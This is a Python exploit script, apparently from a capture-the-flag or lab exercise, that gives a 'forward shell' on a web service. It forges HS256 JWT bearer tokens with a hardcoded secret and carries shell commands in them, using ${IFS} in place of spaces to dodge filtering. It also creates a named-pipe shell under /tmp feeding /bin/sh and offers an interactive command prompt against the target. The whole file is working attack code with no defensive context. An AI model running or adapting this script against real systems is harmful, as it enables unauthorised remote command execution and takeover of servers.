import random
import requests
import threading
import time
import jwt

class ForwardThinking(object):

    def __init__(self):
        #edit this to your target
        self.url = "http://127.0.0.1:4444"
        session = random.randrange(1,65535)
        print(f"[*] Session Value: {session}")
        self.stdin = f'/tmp/input.{session}'
        self.stdout = f'/tmp/output.{session}'

    def setup_pipe(self):
        print("[*] Setting up a named pipe")
        create_pipe = f"/bin/bash -c 'mkfifo {self.stdin} ; tail -f {self.stdin} | /bin/sh >& {self.stdout}'"
        try:
            self.fire(create_pipe)
        except:
            print("[!] Failed to create named pipe!")

    def read_response(self):
        cat_stdout = f"/bin/cat {self.stdout}"
        response = self.fire(cat_stdout)
        if response:
            clean_up = f'echo -n "" > {self.stdout}'
            self.format_cmd(clean_up)
            time.sleep(0.5)
            return response

    def jwt_command(self, cmd):
        secret = b"AIJDSFG9IR45"
        cmd = cmd.replace(" ", "${IFS}")
        encoded_cmd = jwt.encode({"cmd":cmd}, key=secret, algorithm="HS256")
        return encoded_cmd

    def format_cmd(self, cmd):
        command = f"/bin/bash -c 'echo {cmd} > {self.stdin}'"
        return(self.fire(command))

    def fire(self, cmd):
        encoded_command = self.jwt_command(cmd)
        headers = {'Authorization': 'Bearer ' + encoded_command}
        r = requests.get(self.url, headers=headers)
        return r.text

F = ForwardThinking()

t = threading.Thread(target=F.setup_pipe, args=())
t.start()

prompt = "cmd> "
while True:
    cmd = input(prompt)
    if cmd == "quit":
        break
    F.format_cmd(cmd)
    print(F.read_response())

